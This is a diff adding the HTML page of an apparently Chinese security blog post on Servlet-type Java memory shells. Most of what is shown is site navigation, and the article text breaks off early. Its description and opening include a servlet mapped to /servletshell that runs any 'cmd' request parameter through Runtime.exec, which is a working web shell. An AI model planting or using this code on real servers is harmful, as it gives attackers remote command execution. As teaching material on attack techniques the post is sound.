@@ -1,0 +1,390 @@
+<!doctype html><html lang=zh-cn dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='
+  Java 内存马之 Servlet 型内存马
+  #
+
+
+  Servlet 创建
+  #
+
+创建一个 Servlet 的流程是init()->doXXX->destroy()。
+先看一下 Servlet 这个接口有哪些方法：
+public interface Servlet {  
+   void init(ServletConfig var1) throws ServletException; // init方法，创建好实例后会被立即调用，仅调用一次。  
+  
+   ServletConfig getServletConfig();//返回一个ServletConfig对象，其中包含这个servlet初始化和启动参数  
+  
+   void service(ServletRequest var1, ServletResponse var2) throws ServletException, IOException;  //每次调用该servlet都会执行service方法，service方法中实现了我们具体想要对请求的处理。  
+  
+   String getServletInfo();//返回有关servlet的信息，如作者、版本和版权.  
+  
+   void destroy();//只会在当前servlet所在的web被卸载的时候执行一次，释放servlet占用的资源  
+}
+从 Servlet 接口中我们可以看出，如果我们要写恶意代码，应该是写在service()中，所以这里我们直接创建一个恶意的 Servlet 类：
+package tomcatshell.servlet;
+
+import javax.servlet.*;
+import javax.servlet.annotation.WebServlet;
+import java.io.IOException;
+
+@WebServlet(name="servletshell",value = "/servletshell")
+public class ServletTest implements Servlet {
+    @Override
+    public void init(ServletConfig config) throws ServletException {
+
+    }
+
+    @Override
+    public ServletConfig getServletConfig() {
+        return null;
+    }
+
+    @Override
+    public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
+        String cmd = req.getParameter("cmd");
+        if (cmd != null) {
+            try {
+                Runtime.getRuntime().exec(cmd);
+            } catch (IOException e) {
+                throw new RuntimeException(e);
+            }
+        }
+    }
+
+    @Override
+    public String getServletInfo() {
+        return "";
+    }
+
+    @Override
+    public void destroy() {
+
+    }
+}
+
+  Servlet 流程分析
+  #
+
+因为 Web 应用程序的顺序是 Listener -> Filter -> Servlet，所以我们在调用 Servlet 的时候也会看到之前 Listener 和 Filter 的流程。'><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87/java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8Bservlet%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/"><meta property="og:site_name" content="Solowalker"><meta property="og:title" content="Java 内存马之 Servlet 型内存马"><meta property="og:description" content='Java 内存马之 Servlet 型内存马 # Servlet 创建 # 创建一个 Servlet 的流程是init()->doXXX->destroy()。
+先看一下 Servlet 这个接口有哪些方法：
+public interface Servlet { void init(ServletConfig var1) throws ServletException; // init方法，创建好实例后会被立即调用，仅调用一次。 ServletConfig getServletConfig();//返回一个ServletConfig对象，其中包含这个servlet初始化和启动参数 void service(ServletRequest var1, ServletResponse var2) throws ServletException, IOException; //每次调用该servlet都会执行service方法，service方法中实现了我们具体想要对请求的处理。 String getServletInfo();//返回有关servlet的信息，如作者、版本和版权. void destroy();//只会在当前servlet所在的web被卸载的时候执行一次，释放servlet占用的资源 } 从 Servlet 接口中我们可以看出，如果我们要写恶意代码，应该是写在service()中，所以这里我们直接创建一个恶意的 Servlet 类：
+package tomcatshell.servlet; import javax.servlet.*; import javax.servlet.annotation.WebServlet; import java.io.IOException; @WebServlet(name="servletshell",value = "/servletshell") public class ServletTest implements Servlet { @Override public void init(ServletConfig config) throws ServletException { } @Override public ServletConfig getServletConfig() { return null; } @Override public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException { String cmd = req.getParameter("cmd"); if (cmd != null) { try { Runtime.getRuntime().exec(cmd); } catch (IOException e) { throw new RuntimeException(e); } } } @Override public String getServletInfo() { return ""; } @Override public void destroy() { } } Servlet 流程分析 # 因为 Web 应用程序的顺序是 Listener -> Filter -> Servlet，所以我们在调用 Servlet 的时候也会看到之前 Listener 和 Filter 的流程。'><meta property="og:locale" content="zh_cn"><meta property="og:type" content="article"><meta property="article:section" content="docs"><meta property="article:published_time" content="2026-10-26T00:00:00+00:00"><meta property="article:modified_time" content="2026-10-26T00:00:00+00:00"><title>Java 内存马之 Servlet 型内存马 | Solowalker</title><link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87/java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8Bservlet%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/><link rel=stylesheet href=/book.min.bef206ca73466d23b093d88913fd40ccba55f422e1e51ed680a9e04a58cdc341.css integrity="sha256-vvIGynNGbSOwk9iJE/1AzLpV9CLh5R7WgKngSljNw0E=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.d71b89e6b15137012f7361998e2a0988e6a3304e49803493146f4813fd259183.js integrity="sha256-1xuJ5rFRNwEvc2GZjioJiOajME5JgDSTFG9IE/0lkYM=" crossorigin=anonymous></script></head><body dir=ltr><header class=top-header><div class=top-header-inner><div class=top-header-left><img src=/images/logo/solowalker.png alt=Logo class=top-header-logo>
+<a href=https://s0lowalker.github.io/ class=top-header-title>Solowalker</a></div><div class=top-header-right><a href=/friends>友链</a>
+<a href=https://github.com/s0lowalker target=_blank rel=noopener>GitHub</a></div></div></header><input type=checkbox class="hidden toggle" id=menu-control>
+<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><img src=/images/logo/solowalker.png alt=Logo class=book-icon><span>Solowalker</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script><ul><li><input type=checkbox id=section-5727aa49b051f298f64d3a0dfcdaac79 class=toggle checked>
+<label for=section-5727aa49b051f298f64d3a0dfcdaac79 class="flex justify-between"><a role=button>Java安全</a></label><ul><li><input type=checkbox id=section-f3baf843ac4871d7cc6c9747f091d4ee class=toggle checked>
+<label for=section-f3baf843ac4871d7cc6c9747f091d4ee class="flex justify-between"><a role=button>Java攻防</a></label><ul><li><input type=checkbox id=section-94cb9c321d608771dba7d61d7bff1f9f class=toggle checked>
+<label for=section-94cb9c321d608771dba7d61d7bff1f9f class="flex justify-between"><a role=button>内存马篇</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87/java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8Bservlet%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/ class=active>Java 内存马之 Servlet 型内存马</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87/java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8Bjava-agent%E5%86%85%E5%AD%98%E9%A9%AC/>Java 内存马之 Java Agent 内存马</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87/java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8Bvalve%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/>Java 内存马之 Valve 型内存马</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87/java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8Blistener%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/>Java 内存马之 Listener 型内存马</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87/java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8Bfilter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/>Java 内存马之 Filter 型内存马</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87/java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8B%E5%86%85%E5%AD%98%E9%A9%AC%E4%BB%8B%E7%BB%8D/>Java 内存马之内存马介绍</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87/java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8B%E5%9F%BA%E7%A1%80%E7%AF%87/>Java 内存马之基础篇</a></li></ul></li><li><input type=checkbox id=section-40df731824a253d5840b20b53d52c2ba class=toggle>
+<label for=section-40df731824a253d5840b20b53d52c2ba class="flex justify-between"><a role=button>EL表达式</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/el%E8%A1%A8%E8%BE%BE%E5%BC%8F/el-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/>EL 表达式注入</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/el%E8%A1%A8%E8%BE%BE%E5%BC%8F/spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/>SpEL表达式注入</a></li></ul></li><li><input type=checkbox id=section-f40d137f7e26fb2fcb23fda5a456c204 class=toggle>
+<label for=section-f40d137f7e26fb2fcb23fda5a456c204 class="flex justify-between"><a role=button>Weblogic篇</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/weblogic%E7%AF%87/weblogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0ssrf/>Weblogic 弱口令&文件上传&amp;SSRF</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/weblogic%E7%AF%87/weblogic-jndi-%E6%B3%A8%E5%85%A5/>Weblogic JNDI 注入</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/weblogic%E7%AF%87/weblogic-t3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/>Weblogic T3 反序列化分析</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/weblogic%E7%AF%87/weblogic-xmldecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/>Weblogic XMLDecoder反序列化</a></li></ul></li><li><input type=checkbox id=section-f4bd766ffc2c2c4a5fca527ebb421aba class=toggle>
+<label for=section-f4bd766ffc2c2c4a5fca527ebb421aba class="flex justify-between"><a role=button>Log4j2篇</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/log4j2%E7%AF%87/log4shell/>Log4shell</a></li></ul></li><li><input type=checkbox id=section-ed10ff85653d7364765d5831a959b09b class=toggle>
+<label for=section-ed10ff85653d7364765d5831a959b09b class="flex justify-between"><a role=button>Fastjson反序列化</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/fastjson1.2.62-1.2.68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/>Fastjson1.2.62-1.2.68反序列化漏洞</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/>Fasjson各版本绕过</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/fastjson1.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/>Fastjson1.2.24漏洞分析</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/fastjson%E5%9F%BA%E7%A1%80/>Fastjson基础</a></li></ul></li><li><input type=checkbox id=section-5c8ca639d1baf5e5418b2e7f2608a8f1 class=toggle>
+<label for=section-5c8ca639d1baf5e5418b2e7f2608a8f1 class="flex justify-between"><a role=button>Shiro反序列化</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/shiro721/>Shiro721</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/shiro550/>Shiro550</a></li></ul></li><li><input type=checkbox id=section-db4f1366364f6e3bdeccbe9d6728217c class=toggle>
+<label for=section-db4f1366364f6e3bdeccbe9d6728217c class="flex justify-between"><a role=button>Java反序列化之CC链</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc11/>java反序列化之CC11</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcb/>java反序列化之CB</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc7/>java反序列化之CC7</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc5/>java反序列化之CC5</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc2/>java反序列化之CC2</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc4/>java反序列化之CC4</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc3/>java反序列化之CC3</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc6/>java反序列化之CC6</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc1/>Java反序列化之CC1</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Burldns%E9%93%BE/>java反序列化之URLDNS链</a></li></ul></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%B8%B8%E8%A7%84%E6%BC%8F%E6%B4%9E/>Java常规漏洞</a></li></ul></li><li><input type=checkbox id=section-1dc6eb9f6244b6f677832d892b22dc02 class=toggle>
+<label for=section-1dc6eb9f6244b6f677832d892b22dc02 class="flex justify-between"><a role=button>Java基础</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/>23种设计模式</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/spring%E5%BC%80%E5%8F%91/>Spring开发</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/jndi/>JNDI</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/jdk%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/>JDK动态代理</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/java-io%E6%B5%81/>Java IO流</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/java%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/>java类的动态加载</a></li></ul></li></ul></li><li><input type=checkbox id=section-044b235faa94474d25fd6dc85c615699 class=toggle>
+<label for=section-044b235faa94474d25fd6dc85c615699 class="flex justify-between"><a role=button>RASP</a></label><ul><li><a href=/docs/rasp/rasp%E5%BC%80%E5%8F%913%E5%A4%84%E7%90%86%E4%B8%80%E6%AC%A1%E7%9C%9F%E5%AE%9E%E8%AF%B7%E6%B1%82/>RASP开发(3)——处理一次真实请求</a></li><li><a href=/docs/rasp/rasp%E5%BC%80%E5%8F%912%E5%AE%9E%E7%8E%B0%E5%9F%BA%E6%9C%AC%E6%8B%A6%E6%88%AA/>RASP(2)——实现基本拦截</a></li><li><a href=/docs/rasp/rasp%E5%BC%80%E5%8F%911%E7%AC%AC%E4%B8%80%E4%B8%AA%E8%B7%91%E9%80%9A%E7%9A%84javaagent/>RASP开发(1)——第一个跑通的 Java Agent</a></li><li><a href=/docs/rasp/rasp%E5%9F%BA%E7%A1%80/>RASP基础</a></li></ul></li><li><input type=checkbox id=section-473ae1b025d727335a742474995ef6ce class=toggle>
+<label for=section-473ae1b025d727335a742474995ef6ce class="flex justify-between"><a role=button>AI安全</a></label><ul><li><input type=checkbox id=section-9713cf08d8b6b4f6fb6546222f41975d class=toggle>
+<label for=section-9713cf08d8b6b4f6fb6546222f41975d class="flex justify-between"><a role=button>简介</a></label><ul><li><a href=/docs/ai%E5%AE%89%E5%85%A8/%E7%AE%80%E4%BB%8B/llm-%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/>LLM 应用安全</a></li><li><a href=/docs/ai%E5%AE%89%E5%85%A8/%E7%AE%80%E4%BB%8B/%E5%AF%B9%E6%8A%97%E6%A0%B7%E6%9C%AC%E4%B8%8E%E6%A8%A1%E5%9E%8B%E5%AE%89%E5%85%A8/>对抗样本与模型安全</a></li><li><a href=/docs/ai%E5%AE%89%E5%85%A8/%E7%AE%80%E4%BB%8B/%E6%8F%90%E7%A4%BA%E8%AF%8D%E6%B3%A8%E5%85%A5/>提示词注入</a></li><li><a href=/docs/ai%E5%AE%89%E5%85%A8/%E7%AE%80%E4%BB%8B/%E8%B6%8A%E7%8B%B1/>越狱</a></li></ul></li></ul></li><li><input type=checkbox id=section-c4d784444933fdccb12cc39e2ab0a411 class=toggle>
+<label for=section-c4d784444933fdccb12cc39e2ab0a411 class="flex justify-between"><a role=button>渗透测试</a></label><ul><li><input type=checkbox id=section-42c6aa109fe86285746031b39529fd8c class=toggle>
+<label for=section-42c6aa109fe86285746031b39529fd8c class="flex justify-between"><a role=button>web开发篇</a></label><ul><li><a href=/docs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/web%E5%BC%80%E5%8F%91%E7%AF%87/javaee/>JavaEE</a></li><li><a href=/docs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/web%E5%BC%80%E5%8F%91%E7%AF%87/js%E5%BA%94%E7%94%A8/>JS应用</a></li></ul></li><li><input type=checkbox id=section-6f168133498c5817b23bc8b547002dba class=toggle>
+<label for=section-6f168133498c5817b23bc8b547002dba class="flex justify-between"><a role=button>基础入门篇</a></label><ul><li><a href=/docs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/web%E4%B8%8Eapp%E4%B8%8E%E5%B0%8F%E7%A8%8B%E5%BA%8F/>Web、APP与小程序架构基础</a></li></ul></li></ul></li><li><input type=checkbox id=section-326ea580ca38728d53e273bd1a79dd29 class=toggle>
+<label for=section-326ea580ca38728d53e273bd1a79dd29 class="flex justify-between"><a role=button>Nodejs安全</a></label><ul><li><a href=/docs/nodejs%E5%AE%89%E5%85%A8/node.js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%92%8C%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/>Node.js原型链污染和沙箱逃逸漏洞学习笔记</a></li></ul></li><li><input type=checkbox id=section-d8d720db18be1ec4b3cb1ef74548db97 class=toggle>
+<label for=section-d8d720db18be1ec4b3cb1ef74548db97 class="flex justify-between"><a role=button>Web安全</a></label><ul><li><input type=checkbox id=section-31e4da0a6a404b93aaf2d9c04b32c84b class=toggle>
+<label for=section-31e4da0a6a404b93aaf2d9c04b32c84b class="flex justify-between"><a role=button>SQL注入</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5/sqlite%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/>SQLite下的SQL注入</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5/%E5%88%A9%E7%94%A8handler%E8%BF%9B%E8%A1%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/>堆叠注入之利用handler语句获取数据</a></li></ul></li><li><input type=checkbox id=section-2885e3a564b8fe445048e1de37bef089 class=toggle>
+<label for=section-2885e3a564b8fe445048e1de37bef089 class="flex justify-between"><a role=button>SSTI</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/ssti/jinja2%E6%A8%A1%E6%9D%BF%E4%B8%8B%E9%9D%9E%E5%B8%B8%E8%A7%81%E7%9A%84ssti/>Jinja2常见关键字被ban后的SSTI</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/ssti/twig%E6%A8%A1%E6%9D%BF%E4%B8%8B%E7%9A%84ssti/>SSTI之twig</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/ssti/tornado%E6%A8%A1%E6%9D%BF%E4%B8%8B%E7%9A%84ssti/>SSTI之Tornado</a></li></ul></li><li><input type=checkbox id=section-172f63492c2abb7577d01d4bf0de9853 class=toggle>
+<label for=section-172f63492c2abb7577d01d4bf0de9853 class="flex justify-between"><a role=button>文件上传</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E4%B8%8D%E5%90%ABphp%E4%BB%A3%E7%A0%81%E7%9A%84php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0rce/>PHP文件上传不含PHP代码实现RCE的方法</a></li></ul></li><li><input type=checkbox id=section-958f36f10c11df5112dde6c43a89cde5 class=toggle>
+<label for=section-958f36f10c11df5112dde6c43a89cde5 class="flex justify-between"><a role=button>XXE</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/xxe/apache_tika_xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/>Apache Tika XXE漏洞(CVE-2025-66516)</a></li></ul></li><li><input type=checkbox id=section-db3c5efb4a73093a1b77095b857638ed class=toggle>
+<label for=section-db3c5efb4a73093a1b77095b857638ed class="flex justify-between"><a role=button>代码审计</a></label><ul><li><input type=checkbox id=section-2641018cca6e6013f05f7d61b80b4d11 class=toggle>
+<label for=section-2641018cca6e6013f05f7d61b80b4d11 class="flex justify-between"><a role=button>DVWA审计篇</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/>DVWA代码审计之命令注入</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81/>DVWA代码审计之不安全的验证码</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/>DVWA代码审计之暴力破解</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E5%AD%A6%E4%B9%A0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bsql%E6%B3%A8%E5%85%A5/>DVWA代码审计之SQL注入</a></li></ul></li></ul></li></ul></li><li><input type=checkbox id=section-87a84385a267f81ae181c29190fbccaf class=toggle>
+<label for=section-87a84385a267f81ae181c29190fbccaf class="flex justify-between"><a role=button>数据库</a></label><ul><li><a href=/docs/%E6%95%B0%E6%8D%AE%E5%BA%93/%E6%95%B0%E6%8D%AE%E5%BA%93/>MySQL数据库盲区补充</a></li></ul></li><li><a href=/docs/%E5%8F%8D%E5%BC%B9shell/>反弹shell</a></li><li><a href=/docs/phpmyadmin%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABcve-2018-12613/>phpMyAdmin文件包含漏洞(CVE-2018-12613)</a></li></ul></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Java 内存马之 Servlet 型内存马</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#servlet-创建>Servlet 创建</a></li><li><a href=#servlet-流程分析>Servlet 流程分析</a><ul><li><a href=#获取到-http-请求>获取到 HTTP 请求</a></li><li><a href=#读取-webxml>读取 web.xml</a></li><li><a href=#创建与装载-standardwrapper>创建与装载 StandardWrapper</a></li><li><a href=#加载-servlet>加载 Servlet</a></li></ul></li><li><a href=#servlet-内存马>Servlet 内存马</a><ul><li><a href=#servlet-工作流程总结>Servlet 工作流程总结</a></li><li><a href=#servlet-内存马的攻击>Servlet 内存马的攻击</a></li><li><a href=#jsp-版-poc>JSP 版 POC</a></li><li><a href=#java-型内存马>Java 型内存马</a></li></ul></li><li><a href=#总结>总结</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=java-内存马之-servlet-型内存马>Java 内存马之 Servlet 型内存马
+<a class=anchor href=#java-%e5%86%85%e5%ad%98%e9%a9%ac%e4%b9%8b-servlet-%e5%9e%8b%e5%86%85%e5%ad%98%e9%a9%ac>#</a></h1><h2 id=servlet-创建>Servlet 创建
+<a class=anchor href=#servlet-%e5%88%9b%e5%bb%ba>#</a></h2><p>创建一个 Servlet 的流程是<code>init()</code>-><code>doXXX</code>-><code>destroy()</code>。</p><p>先看一下 Servlet 这个接口有哪些方法：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>interface</span> <span style=color:#a6e22e>Servlet</span> {  
